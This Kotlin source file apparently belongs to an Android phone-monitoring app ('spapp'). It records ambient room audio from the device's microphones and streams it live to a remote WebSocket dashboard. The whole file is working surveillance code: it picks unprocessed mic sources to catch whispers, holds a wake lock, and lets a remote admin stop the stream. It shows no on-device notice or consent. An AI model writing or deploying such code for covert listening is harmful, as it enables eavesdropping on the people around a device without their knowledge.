package com.spapp.monitoring.audiostream

import android.Manifest
import android.annotation.SuppressLint
import android.content.Context
import android.content.pm.PackageManager
import android.media.AudioFormat
import android.media.AudioRecord
import android.media.MediaRecorder
import android.os.Build
import android.os.PowerManager
import android.util.Log
import androidx.core.content.ContextCompat
import com.spapp.monitoring.BuildConfig
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.Response
import okhttp3.WebSocket
import okhttp3.WebSocketListener
import okio.ByteString.Companion.toByteString
import org.json.JSONObject
import java.util.concurrent.TimeUnit
import java.util.concurrent.atomic.AtomicBoolean

/**
 * Manages low-latency live surround/ambient audio streaming from the Android device
 * to the backend WebSocket relay.
 *
 * Audio Engineering Architecture:
 * 1. Dual-Mic Spatial Audio: Captures stereo (2-channel) binaural sound from device's primary and secondary mics.
 * 2. Unprocessed Raw Sensor: Uses AudioSource.UNPROCESSED (or CAMCORDER fallback) to disable Android OS
 *    noise gates and gain suppression, preserving room whisper and subtle ambient sounds in 360°.
 * 3. Binary PCM Stream: Direct 16-bit PCM chunks transmitted over WebSocket with zero re-encoding latency.
 * 4. Automatic Hardware Fallback: Safely falls back across sample rates (44.1kHz -> 48kHz -> 16kHz) and
 *    channels (Stereo -> Mono) based on device OEM hardware capabilities.
 * 5. Congestion & Backlog Protection: Drops chunks if WebSocket buffer builds up, guaranteeing real-time playback (<100ms).
 */
object AudioStreamManager {

    private const val TAG = "AudioStreamManager"

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var activeWebSocket: WebSocket? = null
    private var streamJob: Job? = null
    private var wakeLock: PowerManager.WakeLock? = null
    private val isStreaming = AtomicBoolean(false)
    private var onStoppedCallback: (() -> Unit)? = null

    private val wsBaseUrl: String by lazy {
        BuildConfig.API_BASE_URL
            .replaceFirst("http://", "ws://")
            .replaceFirst("https://", "wss://")
            .trimEnd('/')
    }

    data class AudioConfig(
        val audioSource: Int,
        val sampleRate: Int,
        val channelConfig: Int,
        val audioFormat: Int,
        val bufferSizeInBytes: Int,
        val isStereo: Boolean
    )

    @Synchronized
    fun startStreaming(
        context: Context,
        authToken: String,
        deviceId: String,
        onStreamStopped: (() -> Unit)? = null
    ) {
        val hasPermission = ContextCompat.checkSelfPermission(
            context,
            Manifest.permission.RECORD_AUDIO
        ) == PackageManager.PERMISSION_GRANTED

        if (!hasPermission) {
            Log.w(TAG, "RECORD_AUDIO permission missing — cannot start audio stream")
            return
        }

        if (isStreaming.get() && activeWebSocket != null) {
            Log.d(TAG, "Audio stream session already active — skipping redundant start")
            return
        }

        stopStreaming()
        isStreaming.set(true)
        onStoppedCallback = onStreamStopped

        // Acquire WakeLock to keep CPU active during ambient audio capture
        try {
            val pm = context.getSystemService(Context.POWER_SERVICE) as? PowerManager
            wakeLock = pm?.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "spapp:AudioStreamWakeLock")?.apply {
                setReferenceCounted(false)
                acquire(30 * 60 * 1000L) // 30 mins safety max
            }
        } catch (e: Exception) {
            Log.w(TAG, "Failed to acquire WakeLock", e)
        }

        val client = OkHttpClient.Builder()
            .readTimeout(0, TimeUnit.MILLISECONDS)
            .pingInterval(10, TimeUnit.SECONDS)
            .build()

        val wsUrl = "$wsBaseUrl/ws/audio-stream?role=device&deviceId=$deviceId&token=$authToken"
        val request = Request.Builder().url(wsUrl).build()

        Log.d(TAG, "Connecting audio stream WebSocket: $wsUrl")

        client.newWebSocket(request, object : WebSocketListener() {
            override fun onOpen(webSocket: WebSocket, response: Response) {
                Log.d(TAG, "Audio stream WebSocket connected")
                activeWebSocket = webSocket

                // Start audio capture loop
                startRecordingLoop(context, webSocket)
            }

            override fun onMessage(webSocket: WebSocket, text: String) {
                try {
                    val json = JSONObject(text)
                    if (json.optString("action") == "stop") {
                        Log.d(TAG, "Server/Admin requested audio stream stop")
                        stopStreaming()
                    }
                } catch (e: Exception) {
                    Log.w(TAG, "Error handling WS message", e)
                }
            }

            override fun onFailure(webSocket: WebSocket, t: Throwable, response: Response?) {
                Log.e(TAG, "Audio WebSocket connection failure: ${t.message}")
                stopStreaming()
            }

            override fun onClosing(webSocket: WebSocket, code: Int, reason: String) {
                Log.d(TAG, "Audio WebSocket closing ($code): $reason")
                webSocket.close(1000, null)
            }

            override fun onClosed(webSocket: WebSocket, code: Int, reason: String) {
                Log.d(TAG, "Audio WebSocket closed")
                stopStreaming()
            }
        })
    }

    @SuppressLint("MissingPermission")
    private fun startRecordingLoop(context: Context, ws: WebSocket) {
        streamJob?.cancel()
        streamJob = scope.launch(Dispatchers.IO) {
            var recorder: AudioRecord? = null
            try {
                val config = resolveBestAudioConfig()
                if (config == null) {
                    Log.e(TAG, "Failed to find supported AudioRecord configuration on this device")
                    stopStreaming()
                    return@launch
                }

                recorder = AudioRecord(
                    config.audioSource,
                    config.sampleRate,
                    config.channelConfig,
                    config.audioFormat,
                    config.bufferSizeInBytes
                )

                if (recorder.state != AudioRecord.STATE_INITIALIZED) {
                    Log.e(TAG, "AudioRecord failed to initialize")
                    stopStreaming()
                    return@launch
                }

                // Send JSON initialization packet so dashboard knows sample rate & channels
                val initPacket = JSONObject().apply {
                    put("type", "init")
                    put("sampleRate", config.sampleRate)
                    put("channels", if (config.isStereo) 2 else 1)
                    put("format", "pcm16")
                    put("isStereo", config.isStereo)
                }
                ws.send(initPacket.toString())

                recorder.startRecording()
                Log.d(TAG, "Audio recording active: ${config.sampleRate}Hz, Stereo=${config.isStereo}, Source=${config.audioSource}")

                // Chunk size: ~50ms of audio
                val channelMultiplier = if (config.isStereo) 2 else 1
                val chunkSamples = (config.sampleRate * 0.05).toInt() * channelMultiplier
                val pcmBuffer = ShortArray(chunkSamples)
                val byteBuffer = ByteArray(chunkSamples * 2)

                while (isActive && isStreaming.get()) {
                    val readShorts = recorder.read(pcmBuffer, 0, chunkSamples)
                    if (readShorts > 0 && isStreaming.get()) {
                        // Skip audio chunk if socket queue is congested to eliminate lag buildup
                        if (ws.queueSize() > 24 * 1024) continue

                        var byteIdx = 0
                        for (i in 0 until readShorts) {
                            val sample = pcmBuffer[i].toInt()
                            byteBuffer[byteIdx++] = (sample and 0xFF).toByte()
                            byteBuffer[byteIdx++] = ((sample shr 8) and 0xFF).toByte()
                        }

                        ws.send(byteBuffer.toByteString(0, byteIdx))
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "Audio streaming loop error", e)
            } finally {
                try {
                    recorder?.stop()
                    recorder?.release()
                } catch (_: Exception) {}
                Log.d(TAG, "Audio recording stopped")
            }
        }
    }

    /**
     * Resolves the highest quality audio configuration supported by the hardware:
     * 1. Audio Source: UNPROCESSED (raw sensor) -> CAMCORDER (dual mic) -> MIC (standard)
     * 2. Sample Rate: 44100Hz -> 48000Hz -> 16000Hz
     * 3. Channel: Stereo (2-channel binaural) -> Mono (single mic)
     */
    private fun resolveBestAudioConfig(): AudioConfig? {
        val sampleRates = intArrayOf(44100, 48000, 16000)
        val channels = listOf(
            AudioFormat.CHANNEL_IN_STEREO to true,
            AudioFormat.CHANNEL_IN_MONO to false
        )
        val audioSources = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            intArrayOf(
                MediaRecorder.AudioSource.UNPROCESSED,
                MediaRecorder.AudioSource.CAMCORDER,
                MediaRecorder.AudioSource.MIC
            )
        } else {
            intArrayOf(
                MediaRecorder.AudioSource.CAMCORDER,
                MediaRecorder.AudioSource.MIC
            )
        }

        for (source in audioSources) {
            for ((channel, isStereo) in channels) {
                for (rate in sampleRates) {
                    val minBuf = AudioRecord.getMinBufferSize(rate, channel, AudioFormat.ENCODING_PCM_16BIT)
                    if (minBuf > 0) {
                        val bufSize = maxOf(minBuf * 2, 4096)
                        return AudioConfig(
                            audioSource = source,
                            sampleRate = rate,
                            channelConfig = channel,
                            audioFormat = AudioFormat.ENCODING_PCM_16BIT,
                            bufferSizeInBytes = bufSize,
                            isStereo = isStereo
                        )
                    }
                }
            }
        }
        return null
    }

    @Synchronized
    fun stopStreaming() {
        if (!isStreaming.getAndSet(false)) return

        Log.d(TAG, "Stopping audio stream")
        streamJob?.cancel()
        streamJob = null

        try {
            activeWebSocket?.close(1000, "Normal closure")
        } catch (_: Exception) {}
        activeWebSocket = null

        try {
            if (wakeLock?.isHeld == true) {
                wakeLock?.release()
            }
        } catch (_: Exception) {}
        wakeLock = null

        onStoppedCallback?.invoke()
        onStoppedCallback = null
    }

    fun isCurrentlyStreaming(): Boolean = isStreaming.get()
}
